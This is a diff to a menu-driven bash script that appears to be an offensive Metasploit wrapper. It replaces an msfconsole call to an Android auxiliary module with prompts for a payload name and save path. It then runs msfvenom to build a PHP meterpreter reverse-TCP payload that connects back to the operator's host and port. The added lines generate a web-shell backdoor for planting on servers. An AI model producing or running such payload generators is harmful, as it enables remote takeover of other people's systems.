@@ -3089,7 +3089,24 @@ echo '~_~_~_~_~_~_~_~_~_~_~_~_'
 echo -e $red
 read -p " insert : " lport
 echo ""
-msfconsole -x 'use auxiliary/gather/android_htmlfileprovider' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
+echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "What is Name Payload? "
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $red
+read -p " insert : " name
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
+echo ""
+echo -e $green "What is path seve "
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
+read -p " insert : " pathsave
+echo ""
+toilet "Loading" | lolcat
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.php
+echo ""
 
 fi
 if [ $pa = 8 ]
